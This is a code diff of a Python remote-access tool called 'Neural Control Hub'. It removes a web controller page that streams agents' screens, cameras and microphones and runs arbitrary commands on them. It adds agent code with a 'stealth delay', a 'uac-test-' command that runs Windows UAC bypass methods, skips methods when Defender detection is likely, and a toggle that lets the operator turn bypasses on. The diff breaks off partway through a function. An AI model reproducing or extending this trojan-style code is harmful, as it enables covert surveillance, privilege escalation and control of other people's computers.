-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 15px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .agent-item::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(45deg, rgba(0, 212, 255, 0.1), rgba(155, 89, 182, 0.1));
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-
-        .agent-item:hover {
-            border-color: var(--accent-blue);
-            transform: translateY(-2px) scale(1.02);
-            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.4), 0 0 20px rgba(0, 212, 255, 0.2);
-        }
-
-        .agent-item:hover::after {
-            opacity: 1;
-        }
-
-        .agent-item.active {
-            border-color: var(--accent-green);
-            background: rgba(0, 255, 136, 0.15);
-            box-shadow: 0 0 25px rgba(0, 255, 136, 0.3);
-        }
-
-        .agent-item.active::after {
-            opacity: 0;
-        }
-
-        .stream-container {
-            position: relative;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .stream-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-
-        .stream-viewer {
-            flex: 1;
-            background: #000;
-            border-radius: 15px;
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .stream-viewer img {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
-        }
-
-        .stream-overlay {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            background: rgba(0, 0, 0, 0.8);
-            padding: 10px 15px;
-            border-radius: 8px;
-            font-size: 0.9rem;
-        }
-
-        .control-section {
-            margin-bottom: 25px;
-        }
-
-        .control-section h3 {
-            color: var(--accent-blue);
-            margin-bottom: 15px;
-            font-size: 1rem;
-            font-weight: 500;
-        }
-
-        .neural-button {
-            width: 100%;
-            padding: 12px 20px;
-            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-weight: 600;
-            cursor: pointer;
-            margin-bottom: 10px;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            font-size: 0.9rem;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 2px 10px rgba(0, 212, 255, 0.2);
-        }
-
-        .neural-button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
-            transition: left 0.5s ease;
-        }
-
-        .neural-button:hover {
-            transform: translateY(-2px) scale(1.02);
-            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.6), 0 0 30px rgba(0, 212, 255, 0.3);
-            background: linear-gradient(45deg, #00d4ff, #9b59b6);
-            filter: brightness(1.2);
-        }
-
-        .neural-button:hover::before {
-            left: 100%;
-        }
-
-        .neural-button:active {
-            transform: translateY(0) scale(0.98);
-            box-shadow: 0 3px 15px rgba(0, 212, 255, 0.4);
-        }
-
-        .neural-button.danger {
-            background: linear-gradient(45deg, var(--accent-red), #ff6b6b);
-            box-shadow: 0 2px 10px rgba(255, 64, 64, 0.2);
-        }
-
-        .neural-button.danger:hover {
-            background: linear-gradient(45deg, #ff4040, #ff8888);
-            box-shadow: 0 8px 25px rgba(255, 64, 64, 0.6), 0 0 30px rgba(255, 64, 64, 0.3);
-        }
-
-        .neural-button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .neural-button:disabled:hover {
-            transform: none;
-            box-shadow: 0 2px 10px rgba(0, 212, 255, 0.2);
-        }
-
-        .neural-input {
-            width: 100%;
-            padding: 12px 15px;
-            background: var(--tertiary-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-size: 0.9rem;
-            margin-bottom: 10px;
-            transition: all 0.3s ease;
-        }
-
-        .neural-input:focus {
-            outline: none;
-            border-color: var(--accent-blue);
-            box-shadow: 0 0 0 2px rgba(0, 212, 255, 0.2);
-        }
-
-        .command-output {
-            background: #0a0a0a;
-            color: #00ff88;
-            padding: 15px;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.85rem;
-            height: 200px;
-            overflow-y: auto;
-            margin-top: 15px;
-            border: 1px solid var(--accent-blue);
-            white-space: pre-wrap;
-            word-wrap: break-word;
-            line-height: 1.4;
-        }
-        
-        .command-output::-webkit-scrollbar {
-            width: 8px;
-        }
-        
-        .command-output::-webkit-scrollbar-track {
-            background: #0a0a0a;
-        }
-        
-        .command-output::-webkit-scrollbar-thumb {
-            background: var(--accent-blue);
-            border-radius: 4px;
-        }
-
-        .status-indicator {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            margin-right: 8px;
-        }
-
-        .status-online { background: var(--accent-green); }
-        .status-offline { background: var(--accent-red); }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        .loading {
-            animation: pulse 1.5s infinite;
-        }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>Neural Control Hub</h1>
-        <p class="subtitle">Advanced Agent Management System</p>
-    </div>
-
-    <div class="dashboard-grid">
-        <!-- Agents Panel -->
-        <div class="panel agents-panel">
-            <h2>Connected Agents</h2>
-            <div id="agents-list">
-                <div class="agent-item loading">
-                    <span class="status-indicator status-offline"></span>
-                    <span>Scanning for agents...</span>
-                </div>
-            </div>
-        </div>
-
-        <!-- Stream Panel -->
-        <div class="panel stream-container">
-            <div class="stream-header">
-                <h2>Agent Stream</h2>
-                <select id="stream-type" class="neural-input" style="width: auto; margin: 0;">
-                    <option value="screen">Screen</option>
-                    <option value="camera">Camera</option>
-                </select>
-            </div>
-            <div class="stream-viewer" id="stream-viewer">
-                <div style="text-align: center; color: var(--text-secondary);">
-                    <p>Select an agent to view stream</p>
-                </div>
-            </div>
-        </div>
-
-        <!-- Control Panel -->
-        <div class="panel control-panel">
-            <h2>Agent Control</h2>
-            
-            <div class="control-section">
-                <h3>Streaming Control</h3>
-                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'start-stream')">
-                    <span>▶ Start Screen Stream</span>
-                </button>
-                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'stop-stream')">
-                    <span>⏹ Stop Screen Stream</span>
-                </button>
-                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'start-camera')">
-                    <span>📷 Start Camera</span>
-                </button>
-                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'stop-camera')">
-                    <span>⏹ Stop Camera</span>
-                </button>
-                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'start-audio')">
-                    <span>🎤 Start Audio</span>
-                </button>
-                <button class="neural-button" onclick="sendCommandWithFeedback(this, 'stop-audio')">
-                    <span>⏹ Stop Audio</span>
-                </button>
-            </div>
-
-            <div class="control-section">
-                <h3>System Commands</h3>
-                <input type="text" id="command-input" class="neural-input" placeholder="Enter command (e.g., whoami, ipconfig)...">
-                <button class="neural-button" onclick="executeCommand()">
-                    <span>⚡ Execute Command</span>
-                </button>
-                <button class="neural-button danger" onclick="confirmShutdown(this)">
-                    <span>🛑 Shutdown Agent</span>
-                </button>
-            </div>
-
-            <div class="control-section">
-                <h3>Command Output</h3>
-                <div id="command-output" class="command-output"></div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        const socket = io();
-        let selectedAgent = null;
-        let streamType = 'screen';
-
-        // Socket event handlers
-        socket.on('connect', function() {
-            console.log('✅ Connected to controller');
-            console.log('📡 Socket ID:', socket.id);
-            socket.emit('operator_connect');
-            // Request current agents list
-            socket.emit('get_agents');
-        });
-
-        socket.on('agents_list', function(data) {
-            updateAgentsList(data.agents);
-        });
-
-        socket.on('agent_connected', function(data) {
-            addAgent(data.agent_id);
-        });
-
-        socket.on('command_result', function(data) {
-            console.log('📨 Received command_result:', data);
-            console.log('Selected agent:', selectedAgent);
-            console.log('Data agent_id:', data.agent_id);
-            if (data && data.output) {
-                displayCommandResult(data.output);
-            } else {
-                console.warn('⚠️ No output in command_result');
-            }
-        });
-
-        // Listen for all events (debugging)
-        socket.onAny((eventName, ...args) => {
-            console.log(`📡 Event received: ${eventName}`, args);
-        });
-
-        socket.on('screen_frame', function(data) {
-            if (data.agent_id === selectedAgent && streamType === 'screen') {
-                updateStream(data.frame);
-            }
-        });
-
-        socket.on('camera_frame', function(data) {
-            if (data.agent_id === selectedAgent && streamType === 'camera') {
-                updateStream(data.frame);
-            }
-        });
-
-        // UI Functions
-        function updateAgentsList(agents) {
-            const agentsList = document.getElementById('agents-list');
-            agentsList.innerHTML = '';
-            
-            if (agents.length === 0) {
-                agentsList.innerHTML = '<div class="agent-item"><span class="status-indicator status-offline"></span><span>No agents connected</span></div>';
-                return;
-            }
-
-            agents.forEach(agentId => {
-                addAgent(agentId);
-            });
-        }
-
-        function addAgent(agentId) {
-            const agentsList = document.getElementById('agents-list');
-            const agentElement = document.createElement('div');
-            agentElement.className = 'agent-item';
-            agentElement.innerHTML = `
-                <span class="status-indicator status-online"></span>
-                <span>Agent ${agentId.substring(0, 8)}</span>
-            `;
-            agentElement.onclick = () => selectAgent(agentId);
-            agentsList.appendChild(agentElement);
-        }
-
-        function selectAgent(agentId) {
-            selectedAgent = agentId;
-            
-            // Update UI
-            document.querySelectorAll('.agent-item').forEach(item => {
-                item.classList.remove('active');
-            });
-            event.target.closest('.agent-item').classList.add('active');
-            
-            // Start streaming
-            sendCommand('start-stream');
-        }
-
-        function updateStream(frameData) {
-            const streamViewer = document.getElementById('stream-viewer');
-            streamViewer.innerHTML = `<img src="data:image/jpeg;base64,${frameData}" alt="Agent Stream">`;
-        }
-
-        function sendCommand(command) {
-            if (!selectedAgent) {
-                showNotification('Please select an agent first', 'error');
-                return;
-            }
-            
-            console.log('🚀 Sending command:', command, 'to agent:', selectedAgent);
-            
-            // Show command sent feedback
-            showNotification(`Command sent: ${command}`, 'success');
-            
-            socket.emit('execute_command', {
-                agent_id: selectedAgent,
-                command: command
-            });
-            
-            console.log('✅ execute_command event emitted');
-        }
-
-        function showNotification(message, type = 'info') {
-            // Create notification element
-            const notification = document.createElement('div');
-            notification.className = `notification notification-${type}`;
-            notification.textContent = message;
-            notification.style.cssText = `
-                position: fixed;
-                top: 20px;
-                right: 20px;
-                padding: 15px 25px;
-                background: ${type === 'error' ? 'linear-gradient(45deg, #ff4040, #ff6b6b)' : 'linear-gradient(45deg, #00d4ff, #9b59b6)'};
-                color: white;
-                border-radius: 10px;
-                box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
-                z-index: 10000;
-                animation: slideIn 0.3s ease, slideOut 0.3s ease 2.7s;
-                font-weight: 600;
-            `;
-            
-            document.body.appendChild(notification);
-            
-            // Remove after 3 seconds
-            setTimeout(() => {
-                notification.remove();
-            }, 3000);
-        }
-
-        // Add animation styles
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes slideIn {
-                from { transform: translateX(400px); opacity: 0; }
-                to { transform: translateX(0); opacity: 1; }
-            }
-            @keyframes slideOut {
-                from { transform: translateX(0); opacity: 1; }
-                to { transform: translateX(400px); opacity: 0; }
-            }
-            @keyframes buttonPulse {
-                0% { transform: scale(1); }
-                50% { transform: scale(0.95); }
-                100% { transform: scale(1); }
-            }
-        `;
-        document.head.appendChild(style);
-
-        function sendCommandWithFeedback(button, command) {
-            // Animate button
-            button.style.animation = 'buttonPulse 0.3s ease';
-            setTimeout(() => {
-                button.style.animation = '';
-            }, 300);
-            
-            // Send command
-            sendCommand(command);
-        }
-
-        function confirmShutdown(button) {
-            if (confirm('⚠️ Are you sure you want to shutdown the agent?\n\nThis will disconnect the agent from the controller.')) {
-                button.style.animation = 'buttonPulse 0.3s ease';
-                setTimeout(() => {
-                    button.style.animation = '';
-                }, 300);
-                sendCommand('shutdown');
-            }
-        }
-
-        function executeCommand() {
-            const commandInput = document.getElementById('command-input');
-            const command = commandInput.value.trim();
-            
-            if (!command) return;
-            if (!selectedAgent) {
-                alert('Please select an agent first');
-                return;
-            }
-            
-            // Display the command in the output first
-            displayCommandInput(command);
-            
-            sendCommand(command);
-            commandInput.value = '';
-        }
-
-        function displayCommandInput(command) {
-            const commandOutput = document.getElementById('command-output');
-            const timestamp = new Date().toLocaleTimeString();
-            commandOutput.innerHTML += `<span style="color: #00ff88;">[${timestamp}] > ${command}</span>\\n`;
-            commandOutput.scrollTop = commandOutput.scrollHeight;
-        }
-
-        function displayCommandResult(output) {
-            const commandOutput = document.getElementById('command-output');
-            const timestamp = new Date().toLocaleTimeString();
-            // Escape HTML and preserve formatting
-            const escapedOutput = output.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-            commandOutput.innerHTML += `<span style="color: #ffffff;">[${timestamp}] ${escapedOutput}</span>\\n\\n`;
-            commandOutput.scrollTop = commandOutput.scrollHeight;
-        }
-
-        // Stream type selector
-        document.getElementById('stream-type').addEventListener('change', function() {
-            streamType = this.value;
-            if (selectedAgent) {
-                sendCommand(`start-${streamType}`);
-            }
-        });
-
-        // Command input enter key
-        document.getElementById('command-input').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                executeCommand();
-            }
-        });
-    </script>
-</body>
-</html>
-'''
-
-def start_controller(host="0.0.0.0", port=8080, use_ssl=True):
-    """Start the controller server with SSL support."""
-    if not FLASK_AVAILABLE:
-        log_message("Flask/SocketIO not available. Cannot start controller.")
-        return False
-    
-    if not initialize_controller():
-        return False
-    
-    log_message(f"Starting Neural Control Hub on {host}:{port}")
-    
-    # SSL Configuration
-    ssl_context = None
-    if use_ssl:
-        try:
-            import ssl
-            
-            # Generate self-signed certificate if needed
-            cert_file = "cert.pem"
-            key_file = "key.pem"
-            
-            if not os.path.exists(cert_file) or not os.path.exists(key_file):
-                log_message("Generating self-signed SSL certificate...")
-                generate_ssl_certificate(cert_file, key_file)
-            
-            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-            ssl_context.load_cert_chain(cert_file, key_file)
-            
-            log_message("SSL enabled with self-signed certificate")
-            
-        except Exception as e:
-            log_message(f"SSL setup failed: {e}")
-            log_message("Running without SSL...")
-            ssl_context = None
-    
-    try:
-        if ssl_context:
-            controller_socketio.run(
-                controller_app, 
-                host=host, 
-                port=port, 
-                debug=False,
-                ssl_context=ssl_context
-            )
-        else:
-            controller_socketio.run(
-                controller_app, 
-                host=host, 
-                port=port, 
-                debug=False
-            )
-        return True
-    except Exception as e:
-        log_message(f"Failed to start controller: {e}")
-        return False
-
-def generate_ssl_certificate(cert_file, key_file):
-    """Generate a self-signed SSL certificate."""
-    try:
-        from cryptography import x509
-        from cryptography.x509.oid import NameOID
-        from cryptography.hazmat.primitives import hashes
-        from cryptography.hazmat.primitives.asymmetric import rsa
-        from cryptography.hazmat.primitives import serialization
-        import datetime
-        
-        # Generate private key
-        private_key = rsa.generate_private_key(
-            public_exponent=65537,
-            key_size=2048,
-        )
-        
-        # Create certificate
-        subject = issuer = x509.Name([
-            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
-            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "CA"),
-            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
-            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Neural Control Hub"),
-            x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
-        ])
-        
-        cert = x509.CertificateBuilder().subject_name(
-            subject
-        ).issuer_name(
-            issuer
-        ).public_key(
-            private_key.public_key()
-        ).serial_number(
-            x509.random_serial_number()
-        ).not_valid_before(
-            datetime.datetime.utcnow()
-        ).not_valid_after(
-            datetime.datetime.utcnow() + datetime.timedelta(days=365)
-        ).add_extension(
-            x509.SubjectAlternativeName([
-                x509.DNSName("localhost"),
-                x509.IPAddress("127.0.0.1"),
-            ]),
-            critical=False,
-        ).sign(private_key, hashes.SHA256())
-        
-        # Write certificate
-        with open(cert_file, "wb") as f:
-            f.write(cert.public_bytes(serialization.Encoding.PEM))
-        
-        # Write private key
-        with open(key_file, "wb") as f:
-            f.write(private_key.private_bytes(
-                encoding=serialization.Encoding.PEM,
-                format=serialization.PrivateFormat.PKCS8,
-                encryption_algorithm=serialization.NoEncryption()
-            ))
-        
-        log_message(f"Generated SSL certificate: {cert_file} and {key_file}")
-        
-    except ImportError:
-        log_message("cryptography package not available. Using fallback method...")
-        generate_ssl_certificate_openssl(cert_file, key_file)
-    except Exception as e:
-        log_message(f"Failed to generate SSL certificate: {e}")
-        raise
-
-def generate_ssl_certificate_openssl(cert_file, key_file):
-    """Generate SSL certificate using OpenSSL command."""
-    try:
-        # Use OpenSSL command to generate certificate
-        cmd = [
-            "openssl", "req", "-x509", "-newkey", "rsa:2048", 
-            "-keyout", key_file, "-out", cert_file, 
-            "-days", "365", "-nodes", "-subj", 
-            "/C=US/ST=CA/L=San Francisco/O=Neural Control Hub/CN=localhost"
-        ]
-        
-        result = subprocess.run(cmd, capture_output=True, text=True)
-        if result.returncode == 0:
-            log_message(f"Generated SSL certificate using OpenSSL: {cert_file} and {key_file}")
-        else:
-            raise Exception(f"OpenSSL failed: {result.stderr}")
-            
-    except Exception as e:
-        log_message(f"OpenSSL certificate generation failed: {e}")
-        # Create dummy files to avoid errors
-        with open(cert_file, 'w') as f:
-            f.write("# Dummy certificate file\n")
-        with open(key_file, 'w') as f:
-            f.write("# Dummy key file\n")
-        raise
-
-# ========================================================================================
-# UNIFIED MAIN ENTRY POINT
-# ========================================================================================
-
-def main_unified():
-    """Unified main function that can run as agent or controller."""
+def main():
+    """Main function for the standalone Agent."""
     import argparse
     
-    parser = argparse.ArgumentParser(description='Neural Control Hub - Unified Agent/Controller')
-    parser.add_argument('--mode', choices=['agent', 'controller', 'both'], default='agent',
-                       help='Run mode: agent, controller, or both')
-    parser.add_argument('--host', default='0.0.0.0', help='Controller host (controller mode)')
-    parser.add_argument('--port', type=int, default=8080, help='Controller port (controller mode)')
-    parser.add_argument('--no-ssl', action='store_true', help='Disable SSL for controller')
+    parser = argparse.ArgumentParser(description='Neural Control Hub - Standalone Agent')
     parser.add_argument('--fixed-url', action='store_true', help='Force use of fixed SERVER_URL override')
     
     args = parser.parse_args()
-    use_ssl = not args.no_ssl
-    global USE_FIXED_SERVER_URL, SERVER_URL, RUN_MODE
+    
+    global USE_FIXED_SERVER_URL, SERVER_URL
     if args.fixed_url:
         USE_FIXED_SERVER_URL = True
         SERVER_URL = FIXED_SERVER_URL
         log_message(f"Using fixed SERVER_URL: {SERVER_URL}")
     
-    RUN_MODE = args.mode
     # Validate provided default secrets against expected SHA-256 hashes
     try:
         validate_secret_hashes()
     except Exception:
         pass
-    if args.mode == 'controller':
-        log_message("Starting in Controller mode...")
-        if use_ssl:
-            log_message("SSL enabled - Controller will be available at https://{}:{}".format(args.host, args.port))
-        else:
-            log_message("SSL disabled - Controller will be available at http://{}:{}".format(args.host, args.port))
-        start_controller(args.host, args.port, use_ssl)
-    elif args.mode == 'both':
-        log_message("Starting in Both mode (Agent + Controller)...")
-        # Start controller in a separate thread
-        if FLASK_AVAILABLE:
-            if use_ssl:
-                log_message("SSL enabled - Controller will be available at https://{}:{}".format(args.host, args.port))
-            else:
-                log_message("SSL disabled - Controller will be available at http://{}:{}".format(args.host, args.port))
-            controller_thread = threading.Thread(
-                target=start_controller, 
-                args=(args.host, args.port, use_ssl),
-                daemon=True
-            )
-            controller_thread.start()
-            time.sleep(2)  # Give controller time to start
+
+    log_message("Starting in Agent mode...")
+    # Kick off background initializer with progress display and elevated tasks
+    try:
+        initializer = get_background_initializer()
+        initializer.start_background_initialization(quick_startup=False)
+    except Exception as e:
+        log_message(f"Background initializer failed: {e}", "warning")
         
-        # Continue with agent initialization
-        agent_main()
-    else:
-        log_message("Starting in Agent mode...")
-        # Kick off background initializer with progress display and elevated tasks
-        try:
-            initializer = get_background_initializer()  # ✅ Lazy initialization
-            initializer.start_background_initialization(quick_startup=False)
-        except Exception as e:
-            log_message(f"Background initializer failed: {e}", "warning")
-        agent_main()
+    agent_main()
 
 # ========================================================================================
 # SOCKETIO EVENT HANDLERS FOR AGENT
@@ -13732,7 +14513,7 @@ def connect():
                         mem = psutil.virtual_memory().percent
                         net = 0
                         if sio.connected:
-                            safe_emit('agent_telemetry', {'agent_id': agent_id, 'cpu': cpu, 'memory': mem, 'network': net})  # ✅ SAFE
+                            safe_emit('agent_telemetry', {'agent_id': agent_id, 'cpu': cpu, 'memory': mem, 'network': net})  # [ OK ] SAFE
                         else:
                             time.sleep(5)
                     except KeyboardInterrupt:
@@ -14212,22 +14993,22 @@ def on_execute_command(data):
     """
     try:
         print("\n" + "="*80)
-        print("🔍 CLIENT: execute_command EVENT RECEIVED")
+        print("[ MAGNIFIED ] CLIENT: execute_command EVENT RECEIVED")
         print("="*80)
-        print(f"🔍 Data received: {data}")
+        print(f"[ MAGNIFIED ] Data received: {data}")
         
         # Validate Socket.IO availability
         if not SOCKETIO_AVAILABLE or sio is None:
             error_msg = "Socket.IO not available, cannot handle execute_command"
             log_message(error_msg, "error")
-            print(f"❌ Error: {error_msg}")
+            print(f"[ X ] Error: {error_msg}")
             return
         
         # Validate input data
         if not data or not isinstance(data, dict):
             error_msg = "Invalid command data received"
             log_message(error_msg, "error")
-            print(f"❌ Error: {error_msg}")
+            print(f"[ X ] Error: {error_msg}")
             return
         
         agent_id = data.get('agent_id')
@@ -14239,52 +15020,87 @@ def on_execute_command(data):
             pass
         execution_id = data.get('execution_id')
         
-        print(f"🔍 Agent ID in event: {agent_id}")
-        print(f"🔍 Command: {command}")
-        print(f"🔍 Execution ID: {execution_id}")
+        print(f"[ MAGNIFIED ] Agent ID in event: {agent_id}")
+        print(f"[ MAGNIFIED ] Command: {command}")
+        print(f"[ MAGNIFIED ] Execution ID: {execution_id}")
         
         # Validate required fields
         if not agent_id:
             error_msg = "Agent ID is required"
             log_message(error_msg, "error")
-            print(f"❌ Error: {error_msg}")
+            print(f"[ X ] Error: {error_msg}")
             return
         
         if not command:
             error_msg = "Command is required"
             log_message(error_msg, "error")
-            print(f"❌ Error: {error_msg}")
+            print(f"[ X ] Error: {error_msg}")
             return
         
         # Verify this command is for us
         try:
             our_agent_id = get_or_create_agent_id()
-            print(f"🔍 Our agent ID: {our_agent_id}")
+            print(f"[ MAGNIFIED ] Our agent ID: {our_agent_id}")
         except Exception as e:
             error_msg = f"Error getting agent ID: {str(e)}"
             log_message(error_msg, "error")
-            print(f"❌ Error: {error_msg}")
+            print(f"[ X ] Error: {error_msg}")
             return
         
         if agent_id != our_agent_id:
-            print(f"❌ Command not for us (expected {our_agent_id}, got {agent_id})")
+            print(f"[ X ] Command not for us (expected {our_agent_id}, got {agent_id})")
             return  # Not for this agent
         
-        print(f"✅ Command is for us, proceeding to execute: {command}")
+        print(f"[ OK ] Command is for us, proceeding to execute: {command}")
         log_message(f"[EXECUTE_COMMAND] Received: {command} (execution_id: {execution_id})")
         
         # Run command in separate thread to prevent blocking Socket.IO!
-        def execute_in_thread():
-            output = ""
-            success = True
-            
-            try:
-                # Add stealth delay
-                sleep_random_non_blocking()
-            except Exception as e:
-                log_message(f"Error in stealth delay: {str(e)}", "warning")
-                # Continue execution even if stealth delay fails
+    except Exception as e:
+        error_msg = f"Critical error in on_execute_command: {str(e)}"
+        log_message(error_msg, "error")
+        print(f"[ X ] Critical Error: {error_msg}")
         
+        try:
+            if SOCKETIO_AVAILABLE and sio:
+                safe_emit('command_result', {
+                    'agent_id': our_agent_id if 'our_agent_id' in locals() else 'unknown',
+                    'execution_id': execution_id if 'execution_id' in locals() else 'unknown',
+                    'output': error_msg,
+                    'success': False,
+                    'execution_time': 0
+                })
+        except Exception as emit_error:
+            log_message(f"Failed to emit error response: {str(emit_error)}", "error")
+    def execute_in_thread():
+        output = ""
+        success = True
+        
+        try:
+            # Add stealth delay
+            sleep_random_non_blocking()
+        except Exception as e:
+            log_message(f"Error in stealth delay: {str(e)}", "warning")
+            # Continue execution even if stealth delay fails
+        try:
+            if command.startswith("uac-test-"):
+                method = command.replace("uac-test-", "").strip().lower()
+                dbg = run_uac_bypass_test(method)
+                output = json.dumps(dbg, separators=(',', ':'), ensure_ascii=True)
+                success = dbg.get('status') == 'success'
+                safe_emit('command_result', {
+                    'agent_id': our_agent_id,
+                    'execution_id': execution_id,
+                    'command': command,
+                    'output': output,
+                    'success': success,
+                    'terminal_type': 'legacy',
+                    'prompt': get_powershell_prompt(),
+                    'timestamp': int(time.time() * 1000)
+                })
+                return
+        except Exception as e:
+            log_message(f"[EXECUTE_COMMAND] UAC test dispatch error: {e}", "error")
+            pass
         internal_commands = {
             "start-stream": lambda: start_streaming(our_agent_id),
             "stop-stream": stop_streaming,
@@ -14494,23 +15310,7 @@ def on_execute_command(data):
         
         # Return immediately to Socket.IO (don't block!)
         
-    except Exception as e:
-        error_msg = f"Critical error in on_execute_command: {str(e)}"
-        log_message(error_msg, "error")
-        print(f"❌ Critical Error: {error_msg}")
-        
-        # Try to send error response if possible
-        try:
-            if SOCKETIO_AVAILABLE and sio:
-                safe_emit('command_result', {
-                    'agent_id': our_agent_id if 'our_agent_id' in locals() else 'unknown',
-                    'execution_id': execution_id if 'execution_id' in locals() else 'unknown',
-                    'output': error_msg,
-                    'success': False,
-                    'execution_time': 0
-                })
-        except Exception as emit_error:
-            log_message(f"Failed to emit error response: {str(emit_error)}", "error")
+    
 
 def on_bulk_action(data):
     try:
@@ -15125,7 +15925,7 @@ def on_feature_toggle(data):
         feature = str((data or {}).get('feature') or '').strip()
         enabled = bool((data or {}).get('enabled'))
         global WEBRTC_CONFIG
-        global UAC_BYPASS_ALLOWED, DISABLE_UAC_BYPASS
+        global UAC_BYPASS_ALLOWED, DISABLE_UAC_BYPASS, BYPASSES_ENABLED
         if feature == 'adaptive_bitrate':
             WEBRTC_CONFIG['adaptive_bitrate'] = enabled
         elif feature == 'frame_dropping':
@@ -15135,13 +15935,81 @@ def on_feature_toggle(data):
             m['connection_quality_metrics'] = enabled
             WEBRTC_CONFIG['monitoring'] = m
         elif feature == 'uac_bypass':
-            UAC_BYPASS_ALLOWED = False
-            DISABLE_UAC_BYPASS = True
-            enabled = False
+            UAC_BYPASS_ALLOWED = enabled
+            DISABLE_UAC_BYPASS = not enabled
+            BYPASSES_ENABLED = enabled
         safe_emit('feature_toggle_applied', {'feature': feature, 'enabled': enabled, 'agent_id': get_or_create_agent_id()})
     except Exception as e:
         log_message(f"Feature toggle error: {str(e)}", "error")
 
+def run_uac_bypass_test(method_name: str) -> dict:
+    agent_id = None
+    try:
+        agent_id = get_or_create_agent_id()
+    except Exception:
+        agent_id = 'unknown'
+    name = str(method_name or '').strip().lower()
+    emit_bypass_test_debug(None, name, action='click', status='pending', point='handler.enter')
+    pre = _collect_bypass_debug_context(None, name)
+    if not WINDOWS_AVAILABLE:
+        emit_bypass_test_debug(None, name, action='skip', status='skipped', reason='not_windows', point='handler.platform', extra={'pre': pre})
+        return {'agent_id': agent_id, 'method': name, 'status': 'skipped', 'reason': 'not_windows', 'context': pre}
+    try:
+        if DISABLE_UAC_BYPASS or not UAC_BYPASS_ALLOWED:
+            emit_bypass_test_debug(None, name, action='skip', status='skipped', reason='disabled_or_not_allowed', point='handler.global', extra={'pre': pre})
+            return {'agent_id': agent_id, 'method': name, 'status': 'skipped', 'reason': 'disabled_or_not_allowed', 'context': pre}
+    except Exception:
+        pass
+    if is_admin():
+        emit_bypass_test_debug(None, name, action='skip', status='skipped', reason='already_admin', point='handler.admin', extra={'pre': pre})
+        return {'agent_id': agent_id, 'method': name, 'status': 'skipped', 'reason': 'already_admin', 'context': pre}
+    try:
+        if should_skip_uac_method(None, name):
+            emit_bypass_test_debug(None, name, action='skip', status='skipped', reason='defender_detection', point='handler.defender', extra={'pre': pre})
+            return {'agent_id': agent_id, 'method': name, 'status': 'skipped', 'reason': 'defender_detection', 'context': pre}
+    except Exception:
+        pass
+    try:
+        enabled = bool(UAC_BYPASS_METHODS_ENABLED.get(name, True))
+        if not enabled and UAC_BYPASS_ALLOWED and not DISABLE_UAC_BYPASS:
+            UAC_BYPASS_METHODS_ENABLED[name] = True
+    except Exception:
+        pass
+    try:
+        manager = get_uac_manager()
+        method_obj = manager.methods.get(name)
+        if not method_obj or not method_obj.is_available():
+            emit_bypass_test_debug(None, name, action='skip', status='skipped', reason='not_available', point='handler.available', extra={'pre': pre})
+            return {'agent_id': agent_id, 'method': name, 'status': 'skipped', 'reason': 'not_available', 'context': pre}
+    except Exception as e:
+        emit_bypass_test_debug(None, name, action='error', status='error', reason=str(e), point='handler.manager')
+        return {'agent_id': agent_id, 'method': name, 'status': 'error', 'reason': str(e), 'context': pre}
+    emit_bypass_test_debug(None, name, action='execute', status='pending', point='handler.execute', extra={'pre': pre})
+    try:
+        ok = manager.execute_method(name)
+        status = 'success' if ok else 'failed'
+        emit_bypass_test_debug(None, name, action='result', status=status, point='handler.result', extra={'pre': pre})
+        return {'agent_id': agent_id, 'method': name, 'status': status, 'context': _collect_bypass_debug_context(None, name)}
+    except Exception as e:
+        emit_bypass_test_debug(None, name, action='error', status='error', reason=str(e), point='handler.execute_error')
+        return {'agent_id': agent_id, 'method': name, 'status': 'error', 'reason': str(e), 'context': _collect_bypass_debug_context(None, name)}
+
+def on_uac_bypass_test(data):
+    try:
+        method = (data or {}).get('method') or (data or {}).get('name')
+        res = run_uac_bypass_test(method)
+        try:
+            safe_emit('uac_bypass_test_result', res)
+        except Exception:
+            pass
